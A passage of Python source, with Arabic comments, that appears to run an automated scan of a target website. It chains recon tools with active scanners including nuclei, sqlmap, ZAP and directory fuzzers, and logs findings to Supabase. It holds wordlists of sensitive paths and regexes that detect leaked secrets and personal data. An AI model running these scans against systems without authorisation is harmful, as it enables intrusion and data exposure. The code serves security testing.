
import os
import re
import json
import time
import shlex
import subprocess
import tempfile
import glob
from datetime import datetime
from urllib.parse import urlparse

from supabase import create_client


# ============================================================
# الإعدادات الأساسية
# ============================================================

SUPABASE_URL = os.environ["SUPABASE_URL"]
SUPABASE_SERVICE_KEY = os.environ["SUPABASE_SERVICE_KEY"]
SCAN_ID = os.environ["SCAN_ID"]
TARGET_URL = os.environ["TARGET_URL"]

SCAN_START_TIME = time.time()

supabase = create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY)


def _q(value):
    """Safely quote a string for shell command interpolation (prevents injection)."""
    return shlex.quote(str(value))


# ============================================================
# Wordlists داخلية
# ============================================================

BASIC_WORDLIST = [
    "admin", "login", "api", "test", "backup", "config", "wp-admin",
    "wp-login.php", ".env", ".git", "uploads", "images", "assets",
    "dashboard", "panel", "console", "debug", "phpinfo.php", "robots.txt",
    "sitemap.xml", "swagger", "graphql", "v1", "v2", "docs", "dev",
    "staging", "old", "temp", "tmp", ".well-known", "uploads/",
    "includes", "install", "setup", "server-status", "db", "sql",
    "backup.zip", "backup.sql", ".htaccess", "web.config",
    "composer.json", "package.json", ".DS_Store", "README.md",
    "CHANGELOG.md", "index.php.bak", "config.php.bak", "database.yml",
    "api/v1", "api/v2", "api/users", "api/admin", "api/config",
    "graphiql", "playground", "health", "status",
    "actuator", "actuator/health", "actuator/env", "actuator/heapdump",
    ".svn", ".hg", ".bzr", "CVS", "WEB-INF", "META-INF",
]

SENSITIVE_DB_TABLES = [
    "users", "accounts", "customers", "admins", "members",
    "employees", "payments", "transactions", "credentials",
    "sessions", "tokens", "api_keys", "secrets", "passwords",
    "credit_cards", "billing", "profiles", "personal_info",
]

SENSITIVE_FILE_SIGNATURES = {
    ".env": [r"[A-Z_]{2,}\s*=", r"DB_", r"API_KEY", r"SECRET", r"PASSWORD", r"TOKEN"],
    ".git/config": [r"\[core\]", r"repositoryformatversion", r"\[remote"],
    ".git/HEAD": [r"ref:\s*refs/heads/", r"refs/heads/"],
    "wp-config.php": [r"DB_NAME", r"DB_PASSWORD", r"<\?php", r"wp_"],
    "wp-config.php.bak": [r"DB_NAME", r"DB_PASSWORD", r"<\?php", r"wp_"],
    "backup.sql": [r"CREATE TABLE", r"INSERT INTO", r"-- MySQL", r"ENGINE="],
    "dump.sql": [r"CREATE TABLE", r"INSERT INTO", r"-- MySQL"],
    "database.sql": [r"CREATE TABLE", r"INSERT INTO", r"ENGINE="],
    "phpinfo.php": [r"PHP Version", r"phpinfo\(\)", r"PHP License"],
    "server-status": [r"Apache Server Status", r"Current Time", r"Server Version"],
    "server-info": [r"Apache Server Information", r"Server Settings"],
    ".htaccess": [r"RewriteEngine", r"RewriteRule", r"Order allow", r"Require "],
    "web.config": [r"<configuration>", r"<system.web", r"<connectionStrings"],
    "config.php": [r"DB_HOST", r"DB_USER", r"DB_PASS", r"<\?php"],
    "config.json": [r"\"password\"", r"\"api_key\"", r"\"secret\"", r"\"db_"],
    "docker-compose.yml": [r"services:", r"image:", r"environment:"],
    "Dockerfile": [r"^FROM ", r"^RUN ", r"^CMD "],
    ".DS_Store": [r"Bud1"],
    "composer.json": [r"\"require\"", r"\"autoload\""],
    "package.json": [r"\"dependencies\"", r"\"name\""],
}

PII_EMAIL_REGEX = re.compile(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]{2,}")
PII_PHONE_REGEX = re.compile(r"(?:\+\d{1,3}[\s.-]?)?(?:\(\d{1,4}\)[\s.-]?)?\d{3,4}[\s.-]?\d{3,4}[\s.-]?\d{0,4}")
PII_SSN_REGEX = re.compile(r"\b\d{3}-\d{2}-\d{4}\b")
PII_CREDIT_CARD_REGEX = re.compile(r"\b(?:\d[ -]?){13,19}\b")
PII_API_KEY_REGEX = re.compile(r"(?:api[_-]?key|apikey|token|secret)[\"'\s:=]+([A-Za-z0-9_\-]{16,})", re.IGNORECASE)
PII_JWT_REGEX = re.compile(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+")
PII_PRIVATE_KEY_REGEX = re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----")
PII_BCRYPT_REGEX = re.compile(r"\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}")
PII_AWS_KEY_REGEX = re.compile(r"AKIA[0-9A-Z]{16}")
PII_GITHUB_TOKEN_REGEX = re.compile(r"gh[pousr]_[A-Za-z0-9_]{36,}")


# ============================================================
# تسجيل + حفظ + تحديث الحالة
# ============================================================

def log(message, level="info"):
    try:
        supabase.table("logs").insert({
            "scan_id": SCAN_ID,
            "level": level,
            "message": str(message)[:4000],
        }).execute()
    except Exception:
        pass
    safe_msg = str(message)[:1500]
    print(f"[{level.upper()}] {safe_msg}", flush=True)


def update_scan_phase(phase, progress, extra=None):
    try:
        payload = {
            "current_phase": phase,
            "progress_percent": int(progress),
            "elapsed_seconds": int(time.time() - SCAN_START_TIME),
        }
        if extra:
            payload.update(extra)
        supabase.table("scans").update(payload).eq("id", SCAN_ID).execute()
    except Exception as e:
        log(f"تعذر تحديث المرحلة: {e}", "warning")


def verify_evidence(evidence, expected_markers=None, min_length=20):
    if not evidence:
        return False, "لا يوجد دليل"

    if isinstance(evidence, dict):
        non_empty = {}
        for k, v in evidence.items():
            if v is None or v == "" or v == [] or v == {} or v == ():
                continue
            non_empty[k] = v

        if not non_empty:
            return False, "كل الحقول فاضية"

        text_blob = " ".join(str(v) for v in non_empty.values())

        if expected_markers:
            for marker in expected_markers:
                if marker and marker in text_blob:
                    return True, f"دليل مطابق (marker: {marker})"

        if len(text_blob.strip()) >= min_length:
            return True, "دليل نصي كافٍ"

        return False, f"دليل ضعيف (طول {len(text_blob)} < {min_length})"

    if isinstance(evidence, str):
        if len(evidence.strip()) >= min_length:
            return True, "دليل نصي كافٍ"
        return False, "نص قصير جدًا"

    return False, "نوع دليل غير معروف"


def save_result(phase, tool_name, severity, title, description="",
                evidence=None, remediation="", cve_id=None, cvss=None,
                require_evidence=False, expected_markers=None, min_length=20):
    if require_evidence:
        ok, reason = verify_evidence(evidence, expected_markers=expected_markers, min_length=min_length)
        if not ok:
            log(f"⏭️ تخطي finding من {tool_name} (بلا دليل): {str(title)[:80]} — {reason}", "info")
            return False

    try:
        supabase.table("results").insert({
            "scan_id": SCAN_ID,
            "phase": phase,
            "tool_name": tool_name,
            "severity": severity,
            "title": str(title)[:500],
            "description": str(description)[:5000],
            "evidence": evidence or {},
            "remediation": str(remediation)[:3000],
            "cve_id": cve_id,
            "cvss_score": cvss,
        }).execute()
        return True
    except Exception as e:
        print(f"Error saving result: {e}", flush=True)
        return False


# ============================================================
# تنفيذ الأوامر
# ============================================================

def run_command(cmd, timeout=300, cwd=None):
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=cwd,
            errors="ignore",
        )
        return result.stdout or "", result.stderr or "", result.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", -1
    except Exception as e:
        return "", str(e), -1


def tool_exists(tool_name):
    stdout, _, code = run_command(f"command -v {_q(tool_name)} 2>/dev/null", timeout=5)
    return code == 0 and stdout.strip() != ""


def write_wordlist_file(words=None):
    path = tempfile.mktemp(suffix="_wordlist.txt")
    with open(path, "w") as f:
        f.write("\n".join(words or BASIC_WORDLIST))
    return path


# ============================================================
# جلب المحتوى من الهدف
# ============================================================

def fetch_body_snippet(url, max_bytes=3000, timeout=15):
    stdout, _, _ = run_command(
        f"curl -s -L --max-time {timeout} -A 'Mozilla/5.0 (compatible; 10blackfingers)' {_q(url)} 2>/dev/null | head -c {max_bytes}",
        timeout=timeout + 5,
    )
    return (stdout or "").strip()


def fetch_headers(url, timeout=15, use_get=False):
    if use_get:
        stdout, _, _ = run_command(
            f"curl -s -D - -o /dev/null -L --max-time {timeout} -A 'Mozilla/5.0 (compatible; 10blackfingers)' {_q(url)} 2>/dev/null",
            timeout=timeout + 5,
        )
    else:
        stdout, _, _ = run_command(
            f"curl -s -I -L --max-time {timeout} -A 'Mozilla/5.0 (compatible; 10blackfingers)' {_q(url)} 2>/dev/null",
            timeout=timeout + 5,
        )
    return (stdout or "").strip()


def fetch_status_code(url, timeout=15):
    stdout, _, _ = run_command(
        f"curl -s -o /dev/null -w '%{{http_code}}' --max-time {timeout} -L -A 'Mozilla/5.0 (compatible; 10blackfingers)' {_q(url)} 2>/dev/null",
        timeout=timeout + 5,
    )
    return (stdout or "").strip()


def fetch_content_type(url, timeout=15):
    stdout, _, _ = run_command(
        f"curl -s -I -L --max-time {timeout} {_q(url)} 2>/dev/null | grep -i '^content-type' | head -1",
        timeout=timeout + 5,
    )
    return (stdout or "").strip()


# ============================================================
# التحقق من الهدف + استخراج الدومين/البورت
# ============================================================

def check_target_alive():
    status_raw = fetch_status_code(TARGET_URL, timeout=15)

    if not status_raw or not status_raw.isdigit():
        return False, {
            "status_code": None,
            "reason": "تعذر الاتصال بالموقع المستهدف (Timeout أو Connection Error أو الدومين غلط)",
        }

    status_code = int(status_raw)

    if status_code >= 500:
        return False, {
            "status_code": status_code,
            "reason": f"الموقع بيرجع خطأ سيرفر (HTTP {status_code}) - مش هينفع نفحصه بدقة",
        }

    if status_code == 0:
        return False, {"status_code": None, "reason": "لا يوجد أي استجابة من الموقع"}

    return True, {"status_code": status_code, "reason": "الموقع شغال"}


def get_domain():
    """يستخرج الـ hostname فقط (بدون port)."""
    try:
        parsed = urlparse(TARGET_URL)
        host = parsed.hostname
        if host:
            return host
    except Exception:
        pass
    raw = TARGET_URL.replace("https://", "").replace("http://", "")
    return raw.split("/")[0].split(":")[0]


def get_port():
    """يستخرج البورت الحقيقي أو الافتراضي حسب scheme."""
    try:
        parsed = urlparse(TARGET_URL)
        if parsed.port:
            port = parsed.port
            if 1 <= port <= 65535:
                return port
        return 443 if parsed.scheme == "https" else 80
    except Exception:
        return 443


# ============================================================
# أدلة حقيقية موثقة من الموقع المستهدف
# ============================================================

def gather_target_evidence():
    stdout, _, _ = run_command(
        f"curl -s -D - -o /dev/null -w "
        f"'\\nHTTP_STATUS:%{{http_code}}\\nTOTAL_TIME:%{{time_total}}s\\nREMOTE_IP:%{{remote_ip}}\\nREDIRECT_URL:%{{redirect_url}}' "
        f"-A 'Mozilla/5.0 (compatible; 10blackfingers)' {_q(TARGET_URL)} 2>/dev/null",
        timeout=20,
    )
    captured_at = datetime.utcnow().isoformat()
    evidence = {
        "raw_response_headers_and_timing": (stdout or "").strip(),
        "target_url": TARGET_URL,
        "captured_at": captured_at,
    }
    save_result(
        "recon", "evidence_collector", "info",
        "أدلة حقيقية موثقة من الموقع المستهدف وقت الفحص",
        "تم استخراج Headers الفعلية، كود الاستجابة، زمن الاستجابة، وعنوان IP الحقيقي "
        "من الموقع مباشرة وقت تنفيذ الفحص، كدليل يثبت أن النتائج حقيقية وليست افتراضية.",
        evidence=evidence,
        require_evidence=True,
        expected_markers=["HTTP_STATUS:", "REMOTE_IP:"],
    )
    return evidence


# ============================================================
# PHASE 1: RECONNAISSANCE
# ============================================================

def phase_recon():
    update_scan_phase("recon", 5)
    log("═══════════════ بدء مرحلة الاستطلاع (Reconnaissance) ═══════════════")
    domain = get_domain()

    if tool_exists("nmap"):
        log("Running nmap...")
        stdout, _, _ = run_command(
            f"nmap -T4 --top-ports 100 -sV {_q(domain)} -oX - 2>/dev/null",
            timeout=180,
        )
        if stdout:
            ports = re.findall(r'portid="(\d+)".*?name="([^"]*)"', stdout)
            for p, service in ports:
                save_result("recon", "nmap", "info",
                            f"Open port: {p}/{service}",
                            f"Port {p} is open and running {service}",
                            evidence={"port": p, "service": service, "raw_xml_snippet": stdout[:500]})

    if tool_exists("whatweb"):
        log("Running WhatWeb...")
        stdout, _, _ = run_command(f"whatweb {_q(TARGET_URL)} --log-json=- 2>/dev/null", timeout=60)
        if stdout:
            try:
                data = json.loads(stdout)
                for entry in (data if isinstance(data, list) else [data]):
                    plugins = entry.get("plugins", {})
                    for plugin_name, plugin_data in plugins.items():
                        save_result("recon", "whatweb", "info",
                                    f"Technology detected: {plugin_name}",
                                    f"Detected {plugin_name}",
                                    evidence={"plugin": plugin_name, "data": plugin_data})
            except Exception as e:
                log(f"WhatWeb parse error: {e}", "warning")

    if tool_exists("wafw00f"):
        log("Running WAFW00F...")
        stdout, _, _ = run_command(f"wafw00f {_q(TARGET_URL)} -a 2>/dev/null", timeout=60)
        if stdout and "is behind" in stdout:
            m = re.search(r"is behind (.+)", stdout)
            if m:
                waf_name = m.group(1).strip()
                save_result("recon", "wafw00f", "info",
                            f"WAF detected: {waf_name}",
                            "Web Application Firewall detected",
                            evidence={"waf": waf_name, "raw_output": stdout[:500]})

    if tool_exists("subfinder"):
        log("Running subfinder...")
        stdout, _, _ = run_command(f"subfinder -d {_q(domain)} -silent 2>/dev/null", timeout=120)
        if stdout:
            subdomains = [s.strip() for s in stdout.strip().split("\n") if s.strip()]
            if subdomains:
                save_result("recon", "subfinder", "info",
                            f"Found {len(subdomains)} subdomains",
                            "Subdomains discovered",
                            evidence={"subdomains": subdomains[:200], "count": len(subdomains)})

    if tool_exists("amass"):
        log("Running amass...")
        stdout, _, _ = run_command(f"amass enum -passive -d {_q(domain)} -timeout 2 2>/dev/null", timeout=120)
        if stdout:
            entries = [s.strip() for s in stdout.strip().split("\n") if s.strip()]
            if entries:
                save_result("recon", "amass", "info",
                            f"Amass found {len(entries)} entries",
                            "Passive enumeration results",
                            evidence={"entries": entries[:200]})

    if tool_exists("httpx"):
        log("Running httpx...")
        stdout, _, _ = run_command(
            f"httpx -u {_q(TARGET_URL)} -json -silent -tech-detect -status-code -title 2>/dev/null",
            timeout=120,
        )
        if stdout:
            for line in stdout.strip().split("\n"):
                if not line.strip():
                    continue
                try:
                    data = json.loads(line)
                    save_result("recon", "httpx", "info",
                                f"HTTP probe: {data.get('status_code', '?')} - {data.get('title', '')[:80]}",
                                f"Tech: {', '.join(data.get('tech', []) or [])}",
                                evidence=data)
                except json.JSONDecodeError:
                    continue

    if tool_exists("katana"):
        log("Running katana...")
        stdout, _, _ = run_command(
            f"katana -u {_q(TARGET_URL)} -silent -d 3 -jc -timeout 5 2>/dev/null | head -300",
            timeout=300,
        )
        if stdout:
            urls = [u.strip() for u in stdout.strip().split("\n") if u.strip()]
            if urls:
                save_result("recon", "katana", "info",
                            f"Crawled {len(urls)} URLs",
                            "URLs discovered via crawling",
                            evidence={"urls": urls[:200], "count": len(urls)})

    try:
        detect_spa_and_render()
    except Exception as e:
        log(f"SPA detection skipped: {e}", "warning")

    if tool_exists("gau"):
        log("Running gau...")
        stdout, _, _ = run_command(f"echo {_q(domain)} | gau --threads 5 2>/dev/null | head -300", timeout=180)
        if stdout:
            urls = [u.strip() for u in stdout.strip().split("\n") if u.strip()]
            if urls:
                save_result("recon", "gau", "info",
                            f"GAU found {len(urls)} URLs",
                            "Historical URLs from Wayback Machine",
                            evidence={"urls": urls[:200]})

    if tool_exists("waybackurls"):
        log("Running waybackurls...")
        stdout, _, _ = run_command(f"echo {_q(domain)} | waybackurls 2>/dev/null | head -300", timeout=120)
        if stdout:
            urls = [u.strip() for u in stdout.strip().split("\n") if u.strip()]
            if urls:
                save_result("recon", "waybackurls", "info",
                            f"Wayback found {len(urls)} URLs",
                            "URLs from Wayback Machine",
                            evidence={"urls": urls[:200]})

    if tool_exists("dnsx"):
        log("Running dnsx...")
        stdout, _, _ = run_command(f"echo {_q(domain)} | dnsx -silent -a -resp 2>/dev/null", timeout=60)
        if stdout:
            save_result("recon", "dnsx", "info",
                        "DNS records resolved",
                        "DNS A records for target",
                        evidence={"output": stdout[:1000]})

    if tool_exists("naabu"):
        log("Running naabu...")
        stdout, _, _ = run_command(f"naabu -host {_q(domain)} -top-ports 100 -silent 2>/dev/null", timeout=180)
        if stdout:
            ports_list = [p.strip() for p in stdout.strip().split("\n") if p.strip()]
            if ports_list:
                save_result("recon", "naabu", "info",
                            f"Naabu found {len(ports_list)} open ports",
                            "Open ports discovered",
                            evidence={"ports": ports_list})

    if tool_exists("tlsx"):
        log("Running tlsx...")
        stdout, _, _ = run_command(
            f"echo {_q(domain)} | tlsx -silent -san -cn -tls-version 2>/dev/null",
            timeout=60,
        )
        if stdout:
            save_result("recon", "tlsx", "info",
                        "TLS/SSL information",
                        "SSL certificate details",
                        evidence={"output": stdout[:1000]})

    if tool_exists("whois"):
        log("Running whois...")
        stdout, _, _ = run_command(f"whois {_q(domain)} 2>/dev/null | head -50", timeout=60)
        if stdout:
            save_result("recon", "whois", "info",
                        "WHOIS information",
                        "Domain registration details",
                        evidence={"output": stdout[:2000]})

    if tool_exists("dig"):
        log("Running dig...")
        stdout, _, _ = run_command(f"dig {_q(domain)} ANY +short 2>/dev/null", timeout=30)
        if stdout:
            save_result("recon", "dig", "info",
                        "DNS records",
                        "DNS ANY query results",
                        evidence={"output": stdout[:1000]})

    if tool_exists("sslyze"):
        log("Running sslyze...")
        stdout, _, _ = run_command(f"sslyze --regular {_q(domain)} 2>/dev/null | head -100", timeout=120)
        if stdout:
            save_result("recon", "sslyze", "info",
                        "SSL/TLS deep scan",
                        "Certificate and cipher analysis",
                        evidence={"output": stdout[:2000]})

    if tool_exists("dnsrecon"):
        log("Running dnsrecon...")
        stdout, _, _ = run_command(f"dnsrecon -d {_q(domain)} -t std 2>/dev/null | head -80", timeout=120)
        if stdout:
            save_result("recon", "dnsrecon", "info",
                        "DNS reconnaissance",
                        "DNS enumeration results",
                        evidence={"output": stdout[:2000]})

    if tool_exists("fierce"):
        log("Running fierce...")
        stdout, _, _ = run_command(f"fierce --domain {_q(domain)} 2>/dev/null | head -50", timeout=120)
        if stdout:
            save_result("recon", "fierce", "info",
                        "Fierce DNS scan",
                        "DNS enumeration and zone transfer attempt",
                        evidence={"output": stdout[:2000]})

    if tool_exists("theHarvester"):
        log("Running theharvester...")
        stdout, _, _ = run_command(
            f"theHarvester -d {_q(domain)} -b all -l 100 2>/dev/null | head -80",
            timeout=180,
        )
        if stdout:
            save_result("recon", "theharvester", "info",
                        "OSINT gathering",
                        "Emails, hosts, and subdomains discovered",
                        evidence={"output": stdout[:3000]})

    if os.path.exists("/opt/spiderfoot/sf.py"):
        log("Running spiderfoot...")
        stdout, _, _ = run_command(
            f"python3 /opt/spiderfoot/sf.py -s {_q(domain)} -q -o json 2>/dev/null | head -200",
            timeout=180,
        )
        if stdout:
            save_result("recon", "spiderfoot", "info",
                        "SpiderFoot OSINT",
                        "Comprehensive OSINT scan results",
                        evidence={"output": stdout[:3000]})

    log("✅ مرحلة الاستطلاع انتهت")


def detect_spa_and_render():
    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "render_spa.js")
    if not os.path.exists(script_path):
        log("render_spa.js غير موجود - تخطي فحص SPA", "info")
        return

    if not tool_exists("node"):
        log("node غير موجود - تخطي فحص SPA", "info")
        return

    output_path = tempfile.mktemp(suffix="_spa.json")
    log("Running SPA renderer (Puppeteer)...")
    run_command(f"node {_q(script_path)} {_q(TARGET_URL)} {_q(output_path)}", timeout=90)

    try:
        if os.path.exists(output_path):
            with open(output_path, "r") as f:
                data = json.load(f)
            links = data.get("links", [])
            if links:
                save_result("recon", "puppeteer", "info",
                            f"SPA rendering: تم استخراج {len(links)} رابط بعد التحميل الكامل",
                            "الموقع يستخدم JavaScript framework (SPA) - تم استخراج الروابط بعد الـ render الكامل",
                            evidence={"links": links[:200], "is_spa": True})
    except Exception as e:
        log(f"SPA render parse error: {e}", "warning")
    finally:
        if os.path.exists(output_path):
            os.remove(output_path)


# ============================================================
# PHASE 2: KNOWN VULNERABILITIES
# ============================================================

SQLMAP_FINDING_PATTERN = re.compile(
    r"Parameter:\s*(?P<param>.+?)\s*\n"
    r"\s*Type:\s*(?P<type>.+?)\s*\n"
    r"\s*Title:\s*(?P<title>.+?)\s*\n"
    r"(?:\s*Payload:\s*(?P<payload>.+?)\s*\n)?",
    re.MULTILINE,
)


def parse_sqlmap_findings(content):
    findings = []
    for m in SQLMAP_FINDING_PATTERN.finditer(content):
        findings.append({
            "parameter": m.group("param").strip(),
            "type": m.group("type").strip(),
            "title": m.group("title").strip(),
            "payload": (m.group("payload") or "").strip(),
        })
    return findings


def phase_known_vulns():
    update_scan_phase("known_vulns", 30)
    log("═══════════════ بدء مرحلة الفحص النشط (Known Vulnerabilities) ═══════════════")

    # --- Nuclei ---
    if tool_exists("nuclei"):
        log("Running nuclei (broad templates)...")
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            output_file = f.name
        run_command(
            f"nuclei -u {_q(TARGET_URL)} -severity critical,high,medium,low,info "
            f"-json-export {output_file} -irr -silent -timeout 30 "
            f"-t cves/ -t vulnerabilities/ -t misconfiguration/ -t exposures/ "
            f"-t default-logins/ -t takeovers/ -t fuzzing/ 2>/dev/null",
            timeout=1800,
        )
        try:
            with open(output_file, 'r') as f:
                for line in f:
                    try:
                        finding = json.loads(line)
                        info = finding.get("info", {})
                        raw_response = finding.get("response", "") or ""
                        matched_at = finding.get("matched-at", "")
                        template_id = finding.get("template-id", "")

                        evidence = {
                            "matched_at": matched_at,
                            "template": template_id,
                            "type": finding.get("type"),
                            "curl_command": finding.get("curl-command", ""),
                            "response_proof_snippet": raw_response[:1500],
                        }

                        markers = ["HTTP/", "<html", "Server:", "Content-Type:"]
                        if not raw_response.strip():
                            markers = None

                        save_result(
                            "known_vulns", "nuclei",
                            info.get("severity", "info"),
                            info.get("name", "Unknown vulnerability"),
                            info.get("description", ""),
                            evidence=evidence,
                            remediation=info.get("remediation", ""),
                            cve_id=",".join(info.get("classification", {}).get("cve-id", []) or []) or None,
                            require_evidence=True,
                            expected_markers=markers,
                            min_length=15,
                        )
                    except json.JSONDecodeError:
                        continue
        except FileNotFoundError:
            log("Nuclei output file not found", "warning")
        finally:
            if os.path.exists(output_file):
                os.remove(output_file)

    # --- OWASP ZAP baseline ---
    if tool_exists("zap-baseline.py"):
        log("Running OWASP ZAP baseline...")
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            zap_out = f.name
        run_command(
            f"zap-baseline.py -t {_q(TARGET_URL)} -J {zap_out} -I -m 5 2>/dev/null",
            timeout=600,
        )
        try:
            if os.path.exists(zap_out):
                with open(zap_out, 'r') as f:
                    data = json.load(f)
                for site in data.get("site", []):
                    for alert in site.get("alerts", []):
                        risk = (alert.get("riskdesc", "") or "").split(" ")[0].lower()
                        severity = {"high": "high", "medium": "medium", "low": "low", "informational": "info"}.get(risk, "info")
                        instances = alert.get("instances") or [{}]
                        first = instances[0] if instances else {}
                        evidence = {
                            "url": first.get("uri", ""),
                            "evidence_snippet": first.get("evidence", ""),
                            "param": first.get("param", ""),
                            "attack": first.get("attack", ""),
                            "cwe_id": alert.get("cweid"),
                            "wasc_id": alert.get("wascid"),
                            "reference": (alert.get("reference", "") or "")[:500],
                        }
                        save_result("known_vulns", "zap", severity,
                                    alert.get("name", "ZAP finding"),
                                    alert.get("desc", "")[:2000],
                                    evidence=evidence,
                                    remediation=alert.get("solution", "")[:1000],
                                    require_evidence=True,
                                    min_length=10)
        except Exception as e:
            log(f"ZAP parse error: {e}", "warning")
        finally:
            if os.path.exists(zap_out):
                os.remove(zap_out)

    # --- Nikto ---
    if tool_exists("nikto"):
        log("Running nikto...")
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            nikto_out = f.name
        run_command(
            f"nikto -h {_q(TARGET_URL)} -Format json -output {nikto_out} -maxtime 300 2>/dev/null",
            timeout=400,
        )
        try:
            with open(nikto_out, 'r') as f:
                content = f.read()
                if content:
                    data = json.loads(content)
                    for vuln in data.get("vulnerabilities", []):
                        save_result("known_vulns", "nikto", "medium",
                                    vuln.get("msg", "Nikto finding")[:200],
                                    f"URL: {vuln.get('url', '')}, Method: {vuln.get('method', '')}",
                                    evidence={"id": vuln.get("id"), "url": vuln.get("url"),
                                              "method": vuln.get("method"), "osvdb": vuln.get("OSVDB")})
        except Exception as e:
            log(f"Nikto parse error: {e}", "warning")
        finally:
            if os.path.exists(nikto_out):
                os.remove(nikto_out)

    # --- SQLMap (basic detection) ---
    if tool_exists("sqlmap"):
        log("Running sqlmap (detection)...")
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            sqlmap_out = f.name
        run_command(
            f"sqlmap -u {_q(TARGET_URL)} --batch --level=2 --risk=2 "
            f"--output-dir=/tmp/sqlmap --forms --crawl=2 --timeout=10 --retries=1 --smart "
            f"2>/dev/null | tee {sqlmap_out}",
            timeout=900,
        )
        try:
            with open(sqlmap_out, 'r') as f:
                content = f.read()
            sql_findings = parse_sqlmap_findings(content)
            for finding in sql_findings:
                save_result("known_vulns", "sqlmap", "critical",
                            f"SQL Injection: {finding['title']}",
                            f"Parameter: {finding['parameter']} | Type: {finding['type']}",
                            evidence=finding,
                            remediation="استخدم Prepared Statements و Parameterized Queries بدل الاستعلامات المباشرة",
                            require_evidence=True)
        except Exception as e:
            log(f"SQLMap parse error: {e}", "warning")
        finally:
            if os.path.exists(sqlmap_out):
                os.remove(sqlmap_out)

    # --- Wapiti ---
    if tool_exists("wapiti"):
        log("Running wapiti...")
        wapiti_dir = tempfile.mkdtemp(prefix=f"wapiti_{SCAN_ID[:8]}_")
        run_command(
            f"wapiti -u {_q(TARGET_URL)} -f json -o {_q(wapiti_dir)} -m all --flush-session 2>/dev/null",
            timeout=600,
        )
        try:
            json_files = glob.glob(os.path.join(wapiti_dir, "*.json"))
            for jf in json_files:
                try:
                    with open(jf, 'r') as f:
                        data = json.load(f)
                except Exception:
                    continue

                vulns_data = data.get("vulnerabilities", {})

                if isinstance(vulns_data, dict):
                    for vuln_type, vulns in vulns_data.items():
                        if not isinstance(vulns, list):
                            continue
                        for v in vulns:
                            if not isinstance(v, dict):
                                continue
                            save_result("known_vulns", "wapiti",
                                        v.get("level", "medium"),
                                        f"{vuln_type}: {v.get('info', '')}"[:200],
                                        str(v.get("parameter", ""))[:500],
                                        evidence=v)
                elif isinstance(vulns_data, list):
                    for v in vulns_data:
                        if not isinstance(v, dict):
                            continue
                        vtype = v.get("type", v.get("category", "wapiti"))
                        save_result("known_vulns", "wapiti",
                                    v.get("level", "medium"),
                                    f"{vtype}: {v.get('info', '')}"[:200],
                                    str(v.get("parameter", ""))[:500],
                                    evidence=v)
        except Exception as e:
            log(f"Wapiti parse error: {e}", "warning")
        finally:
            run_command(f"rm -rf {_q(wapiti_dir)}", timeout=10)

    # --- Gobuster ---
    if tool_exists("gobuster"):
        log("Running gobuster...")
        wl = write_wordlist_file()
        stdout, _, _ = run_command(
            f"gobuster dir -u {_q(TARGET_URL)} -w {_q(wl)} -t 20 -q 2>/dev/null | head -100",
            timeout=300,
        )
        if os.path.exists(wl):
            os.remove(wl)
        if stdout:
            paths = [p.strip() for p in stdout.strip().split("\n") if p.strip()]
            if paths:
                save_result("known_vulns", "gobuster", "info",
                            f"Gobuster found {len(paths)} paths",
                            "Directory brute-force results",
                            evidence={"paths": paths[:100]})

    # --- FFuf ---
    if tool_exists("ffuf"):
        log("Running ffuf...")
        wl = write_wordlist_file()
        ffuf_json = tempfile.mktemp(suffix="_ffuf.json")
        base_url = TARGET_URL.rstrip("/")
        run_command(
            f"ffuf -u {_q(base_url + '/FUZZ')} -w {_q(wl)} "
            f"-mc 200,201,202,204,301,302,307,401,403 -fc 404 "
            f"-t 20 -timeout 10 -o {ffuf_json} -of json -s 2>/dev/null",
            timeout=240,
        )
        try:
            if os.path.exists(ffuf_json):
                with open(ffuf_json, 'r') as f:
                    data = json.load(f)
                findings = data.get("results", [])
                if findings:
                    enriched = [
                        {"url": r.get("url"), "status": r.get("status"), "length": r.get("length")}
                        for r in findings[:100]
                    ]
                    confirmed = [e for e in enriched if e.get("status") == 200][:5]
                    for e in confirmed:
                        e["content_proof_snippet"] = fetch_body_snippet(e["url"], max_bytes=500)
                    save_result("known_vulns", "ffuf", "info",
                                f"FFuf found {len(findings)} paths/endpoints",
                                "Directory/parameter fuzzing results",
                                evidence={"results": enriched})
        except Exception as e:
            log(f"FFuf parse error: {e}", "warning")
        finally:
            for p in [wl, ffuf_json]:
                if os.path.exists(p):
                    os.remove(p)

    # --- Dirsearch ---
    if tool_exists("dirsearch"):
        log("Running dirsearch...")
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            dirsearch_out = f.name
        run_command(
            f"dirsearch -u {_q(TARGET_URL)} -e php,html,js,txt,json,xml,yml,yaml,bak,sql,git,env "
            f"-t 20 --format=json -o {dirsearch_out} 2>/dev/null",
            timeout=300,
        )
        try:
            with open(dirsearch_out, 'r') as f:
                data = json.load(f)
                for r in data.get("results", []):
                    save_result("known_vulns", "dirsearch", "info",
                                f"Path found: {r.get('path', '')}",
                                f"Status: {r.get('status', '')}, Size: {r.get('content-length', '')}",
                                evidence=r)
        except Exception as e:
            log(f"Dirsearch parse error: {e}", "warning")
        finally:
            if os.path.exists(dirsearch_out):
                os.remove(dirsearch_out)

    # --- Wfuzz ---
    if tool_exists("wfuzz"):
        log("Running wfuzz...")
        wl = write_wordlist_file()
        base_url = TARGET_URL.rstrip("/")
        stdout, _, _ = run_command(
            f"wfuzz -c -z file,{_q(wl)} --hc 404 -t 20 {_q(base_url + '/FUZZ')} 2>/dev/null",
            timeout=180,
        )
        if os.path.exists(wl):
            os.remove(wl)
        if stdout:
            lines = [l.strip() for l in stdout.strip().split("\n")
                     if l.strip() and re.match(r"^\d+", l.strip())]
            if lines:
                save_result("known_vulns", "wfuzz", "info",
                            f"Wfuzz found {len(lines)} results",
                            "Fuzzing results",
